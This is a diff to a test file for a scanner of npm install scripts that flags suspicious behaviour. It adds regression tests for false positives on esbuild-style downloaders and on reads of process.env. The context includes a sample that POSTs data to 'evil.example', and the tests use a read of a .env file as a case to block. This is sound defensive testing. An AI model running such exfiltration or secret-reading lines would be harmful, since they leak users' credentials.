@@ -80,6 +80,28 @@ require('https').request({ host: 'evil.example', method: 'POST' }).end(data)`
   })
 })
 
+describe('E2E 实测误报回归（esbuild/sharp 形态,2026-08-21 真机扫描发现）', () => {
+  it('process.env 属性访问不触发敏感路径(原 .env 正则误报)', () => {
+    const a = analyzeInstallScript('node install.js', {
+      'install.js': `const proxy = process.env.https_proxy
+const target = process.platform === 'win32' ? 'x64' : 'arm'
+if (proxy) console.log(proxy)`,
+    })
+    expect(a.signals.some((s) => s.text.includes('敏感路径'))).toBe(false)
+  })
+  it('env + 仅已知分发域名(esbuild 下载器形态)→ pass', () => {
+    const esbuildLike = `const fs = require('fs')
+const proxy = process.env.npm_config_https_proxy
+const url = 'https://registry.npmjs.org/@esbuild/win32-x64/-/win32-x64-0.25.0.tgz'
+download(url)
+function download(u) { require('https').get(u, proxy ? { agent: proxyAgent(proxy) } : {}) }`
+    expect(analyzeInstallScript('node install.js', { 'install.js': esbuildLike }).verdict).toBe('pass')
+  })
+  it('真 .env 文件路径仍触发敏感路径', () => {
+    expect(analyzeInstallScript('node a.js', { 'a.js': `require('fs').readFileSync('.env')` }).verdict).toBe('block')
+  })
+})
+
 describe('未知 → warn（保守不误报也不漏报）', () => {
   it('引用的脚本文件未能读取 → warn', () => {
     const a = analyzeInstallScript('node install.js')
